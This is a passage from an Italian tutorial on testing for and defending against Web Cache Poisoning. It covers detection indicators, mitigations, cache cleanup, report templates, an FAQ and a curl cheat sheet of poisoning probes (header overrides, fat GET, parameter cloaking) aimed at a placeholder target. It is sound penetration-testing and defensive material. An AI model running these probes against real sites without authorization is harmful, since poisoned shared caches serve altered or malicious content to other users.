* input non utilizzato dal backend;
* risposta presa dalla cache prima di raggiungere l’origin;
* encoding;
* riflessione presente in un’altra route;
* richiesta inviata al virtual host sbagliato.

### Il marker compare ma scompare subito

Possibili cause:

* TTL breve;
* cache revalidation;
* invalidazione automatica;
* nodo edge differente;
* risposta non memorizzata;
* `Set-Cookie`;
* `Vary` crea una variante diversa.

### Il cache buster non isola

La query string o quel parametro potrebbero essere esclusi dalla chiave.

Non continuare sulla route condivisa.

### `Cache-Control: no-cache` ma vedo HIT

È possibile: `no-cache` consente la memorizzazione, ma richiede validazione prima del riutilizzo.

### Il purge non elimina tutto

Possibili cause:

* cache multilivello;
* key differente;
* cache regionale;
* browser cache;
* cache interna;
* purge per URL che non copre le varianti.

***

## Detection

La rilevazione richiede telemetria da:

* CDN;
* reverse proxy;
* WAF;
* origin;
* cache applicativa;
* browser o RUM, quando disponibile.

Indicatori utili:

* `X-Forwarded-Host` con domini non autorizzati;
* header proxy provenienti direttamente da Internet;
* `X-Original-URL` o `X-Rewrite-URL` inviati dai client;
* GET con body;
* method override su pagine cacheabili;
* porte anomale in `Host`;
* query analytics contenenti payload;
* parametri duplicati o separatori anomali;
* richieste con numerosi cache buster;
* errori `400` o `500` serviti come HIT;
* risposte HIT contenenti domini sconosciuti;
* variazioni improvvise degli URL canonici;
* picchi di purge o invalidazioni;
* risposte personalizzate servite senza cookie;
* discrepanze tra URL ricevuto dall’edge e URL inviato all’origin.

Correlazione:

```text
Input anomalo
      ↓
Origin genera una risposta differente
      ↓
La cache salva la risposta
      ↓
Richieste pulite ricevono lo stesso contenuto
```

Campi utili da registrare:

```text
timestamp
request ID
edge PoP
cache status
cache key o suo hash
URL originale
URL normalizzato
header rimossi
header inoltrati
TTL
Age
origin status
response hash
```

***

## Mitigazioni

### Memorizzare soltanto contenuti realmente condivisibili

Evita regole generiche come:

```text
Cache everything
```

su pagine che dipendono da:

* autenticazione;
* cookie;
* ruolo;
* tenant;
* lingua;
* preferenze;
* header proxy;
* query dinamiche;
* body della richiesta.

### Rimuovere gli header proxy forniti dal client

Il reverse proxy deve:

1. eliminare gli header esterni non fidati;
2. generare nuovamente i valori attendibili;
3. inoltrare al backend soltanto quelli prodotti dall’infrastruttura.

Esempi:

```text
X-Forwarded-Host
X-Forwarded-Proto
X-Forwarded-Port
X-Real-IP
Forwarded
X-Original-URL
```

### Allineare la cache key al comportamento dell’origin

Ogni input capace di modificare legittimamente la risposta deve:

* essere incluso nella cache key;
* creare una variante tramite `Vary`;
* essere normalizzato;
* oppure provocare il bypass della cache.

### Non includere input inutili nella chiave

Inserire ogni header nella cache key non è una buona soluzione.

Può causare:

* cache fragmentation;
* basso hit ratio;
* consumo di memoria;
* bypass involontari;
* denial of service della cache.

Includi soltanto gli input che devono realmente produrre varianti.

### Usare correttamente Cache-Control

Contenuti sensibili:

```http
Cache-Control: no-store
```

Contenuti personali memorizzabili soltanto dal browser:

```http
Cache-Control: private
```

Contenuti pubblici:

```http
Cache-Control: public, max-age=300
```

Cache condivisa con TTL specifico:

```http
Cache-Control: public, max-age=60, s-maxage=300
```

### Evitare body nelle GET cacheabili

Se il body modifica la risposta:

* usa POST;
* disabilita il caching;
* oppure configura una chiave che rappresenti in modo sicuro il contenuto.

### Normalizzazione coerente

Edge, WAF, proxy e backend devono interpretare allo stesso modo:

```text
path
slash multipli
dot segment
percent encoding
query string
ordine dei parametri
parametri duplicati
punto e virgola
porta
hostname
maiuscole e minuscole
```

L’URL usato per la chiave deve essere coerente con quello inviato all’origin.

### Separare contenuti pubblici e privati

Non usare la stessa route per:

```text
pagina pubblica
pagina autenticata
risposta personalizzata
risposta amministrativa
```

senza una strategia di caching esplicita.

### Non memorizzare errori indiscriminatamente

Definisci TTL prudenti per:

```text
400
403
404
500
502
503
```

e verifica che input non fidati non possano creare errori condivisi.

### Defense in depth

Una Content Security Policy non corregge il Cache Poisoning, ma può ridurre l’impatto di JavaScript avvelenato.

Le raccomandazioni operative per evitare poisoning e allineare URL e cache key sono descritte anche nella guida Cloudflare su come [evitare il Web Cache Poisoning](https://developers.cloudflare.com/cache/cache-security/avoid-web-poisoning/).

***

## Cleanup

Quando hai accesso alla piattaforma CDN usa:

```text
purge URL
purge cache key
invalidate path
purge tag
purge prefix
```

Registra:

```text
URL avvelenata
cache key
marker
TTL
PoP coinvolti
orario del test
metodo di purge
orario della verifica finale
```

Dopo il purge:

```bash
curl -sk \
  -D /tmp/cleanup.headers \
  -o /tmp/cleanup.body \
  "https://target.example/page?cb=a83f10"

grep -Rni \
  "cache-test" \
  /tmp/cleanup.headers \
  /tmp/cleanup.body
```

Nessun risultato dimostra soltanto che quella specifica variante non contiene il marker.

Ripeti il controllo:

* senza cache buster;
* con varianti definite da `Vary`;
* da PoP differenti, quando possibile;
* sulla cache interna;
* dopo la scadenza del TTL.

Elimina gli artefatti locali:

```bash
rm -f /tmp/*.headers
rm -f /tmp/*.body
```

***

## Ambiente di laboratorio da documentare

Per rendere il finding verificabile e citabile, registra:

```text
Data del test:
Sistema operativo tester:
Versione Burp Suite:
Versione Param Miner:
Protocollo HTTP:
CDN o reverse proxy:
Origin server:
Endpoint:
Cache status osservati:
TTL:
Header Vary:
Cache-Control:
Cache buster:
Marker:
PoP:
```

Esempio:

```text
Data: 13 luglio 2026
Client: Kali Linux
HTTP: HTTP/2 verso edge, HTTP/1.1 verso origin
Cache: reverse proxy identificato tramite Via
Endpoint: /news
TTL: 300 secondi
Input: X-Forwarded-Host
Marker: cache-test-a83f10.example
Conferma: marker presente nella richiesta pulita con Age: 19
Cleanup: purge della singola URL
```

Usa soltanto valori realmente osservati nel tuo laboratorio.

***

## Come documentare il finding

Un report completo dovrebbe contenere:

| Campo             | Informazione                                 |
| ----------------- | -------------------------------------------- |
| Endpoint          | URL vulnerabile                              |
| Livello di cache  | CDN, proxy o cache interna                   |
| Cache oracle      | Risorsa usata per osservare il comportamento |
| Cache key         | Componenti confermati o dedotti              |
| Input             | Header, cookie, parametro o body             |
| Gadget            | Come l’input modifica la risposta            |
| Prova del caching | HIT, Age o comportamento equivalente         |
| Richiesta pulita  | Prova che riceve ancora il marker            |
| TTL               | Durata osservata                             |
| Scope             | PoP, lingua, browser o variante              |
| Impatto           | Redirect, XSS, DoS o contenuto alterato      |
| Cleanup           | Purge e verifica finale                      |

Sequenza minima:

```text
Richiesta baseline
Richiesta con marker
Risposta alterata
Richiesta pulita
Risposta ancora alterata
Prova di cache HIT
Richiesta con cache key differente
Risposta pulita
```

***

## FAQ

### Cos’è il Web Cache Poisoning?

Il Web Cache Poisoning è una vulnerabilità in cui un input controllato dall’utente modifica una risposta memorizzata da una cache HTTP. Se l’input non viene incluso nella cache key, le richieste successive considerate equivalenti possono ricevere la risposta alterata anche senza contenere il payload originale.

### Come si verifica se una pagina è memorizzata nella cache?

Ripeti la stessa richiesta e controlla header come `Age`, `X-Cache`, `CF-Cache-Status`, `Via` e `X-Served-By`. Un passaggio da MISS a HIT è indicativo. In assenza di header diagnostici, confronta latenza, contenuto, TTL e comportamento usando una cache key isolata.

### Quali header si testano nel Cache Poisoning?

I candidati più comuni includono `X-Forwarded-Host`, `X-Forwarded-Proto`, `X-Forwarded-Port`, `Forwarded`, `X-Original-URL`, `X-Rewrite-URL` e gli header di method override. Nessuno è vulnerabile automaticamente: bisogna dimostrare che modifica la risposta e che non differenzia la cache key.

### Come si conferma realmente la vulnerabilità?

La conferma richiede una richiesta con un marker che modifica la risposta, seguita da una richiesta pulita sulla stessa cache key. Se la richiesta pulita riceve ancora il marker e la risposta proviene dalla cache, mentre una cache key differente rimane pulita, il poisoning è dimostrato.

### Qual è la differenza tra Cache Poisoning e Cache Deception?

Nel Cache Poisoning l’attaccante inserisce nella cache una risposta alterata affinché venga distribuita ad altri utenti. Nella Cache Deception induce invece una vittima autenticata a generare una risposta privata che viene memorizzata erroneamente come pubblica e recuperata successivamente.

### Un X-Cache HIT conferma il Cache Poisoning?

No. Un HIT dimostra soltanto che una risposta è stata riutilizzata dalla cache. Devi dimostrare anche che il marker controllato è stato memorizzato e che una richiesta senza payload riceve la stessa risposta alterata.

### Cache-Control no-cache impedisce la memorizzazione?

No. `no-cache` permette la memorizzazione, ma richiede una validazione prima del riutilizzo. La direttiva che vieta la memorizzazione è `no-store`. `private` impedisce invece normalmente la conservazione nelle cache condivise.

### Che cos’è il parameter cloaking?

È una tecnica che sfrutta una differenza nel parsing dei parametri tra cache e backend. La cache può considerare un parametro nascosto come parte di un parametro escluso dalla chiave, mentre il backend lo interpreta separatamente e lo usa per modificare la risposta.

### Cos’è una fat GET?

È una richiesta GET contenente un body. Alcuni backend elaborano il body, mentre la cache crea la chiave usando soltanto URL e header. Se il body modifica una risposta cacheabile senza essere rappresentato nella chiave, può diventare un vettore di poisoning.

### Come si previene il Web Cache Poisoning?

Bisogna memorizzare soltanto risposte realmente condivisibili, rimuovere gli header proxy forniti dai client, allineare cache key e comportamento dell’origin, usare correttamente `Cache-Control` e `Vary`, evitare body nelle GET cacheabili e applicare la stessa normalizzazione su CDN, WAF, proxy e backend.

***

## Cheat Sheet

```bash
URL="https://target.example/page"
BUSTER="cb-$(openssl rand -hex 6)"
CLEAN_BUSTER="cb-$(openssl rand -hex 6)"
MARKER="cache-test-$(openssl rand -hex 6).example"

# 1. Baseline
curl -sk \
  -D /tmp/base.headers \
  -o /tmp/base.body \
  "$URL?$BUSTER"

# 2. Richiesta con X-Forwarded-Host
curl -sk \
  -D /tmp/poison.headers \
  -o /tmp/poison.body \
  -H "X-Forwarded-Host: $MARKER" \
  "$URL?$BUSTER"

# 3. Verifica riflessione
grep -Rni "$MARKER" \
  /tmp/poison.headers \
  /tmp/poison.body

# 4. Richiesta pulita sulla stessa cache key
curl -sk \
  -D /tmp/victim.headers \
  -o /tmp/victim.body \
  "$URL?$BUSTER"

# 5. Conferma persistenza
grep -Rni "$MARKER" \
  /tmp/victim.headers \
  /tmp/victim.body

# 6. Controlla cache status
grep -Ei \
  '^(age|x-cache|x-cache-hits|cf-cache-status|via|cache-control|vary):' \
  /tmp/victim.headers

# 7. Chiave differente: deve essere pulita
curl -sk \
  -D /tmp/control.headers \
  -o /tmp/control.body \
  "$URL?$CLEAN_BUSTER"

grep -Rni "$MARKER" \
  /tmp/control.headers \
  /tmp/control.body

# Protocol override
curl -sk -i \
  -H "X-Forwarded-Proto: http" \
  "$URL?$BUSTER"

# Port override
curl -sk -i \
  -H "X-Forwarded-Port: 1337" \
  "$URL?$BUSTER"

# Cookie non incluso
curl -sk \
  -H "Cookie: language=it" \
  "$URL?$BUSTER"

# Fat GET
curl -sk \
  -X GET \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data "language=cache-test" \
  "$URL?$BUSTER"

# Method override
curl -sk \
  -H "X-HTTP-Method-Override: POST" \
  "$URL?$BUSTER"

# Parameter cloaking
curl -sk \
  --path-as-is \
  "$URL?utm_content=abc;callback=cache-test"

# Normalized path
curl -sk -i \
  --path-as-is \
  "https://target.example/./page?$BUSTER"

# Cleanup locale
rm -f /tmp/*.headers /tmp/*.body
```

> Esegui queste verifiche esclusivamente su applicazioni di tua proprietà o per le quali possiedi un’autorizzazione esplicita. Usa un endpoint isolato, un marker innocuo e una procedura di purge concordata prima di effettuare test su una cache condivisa.
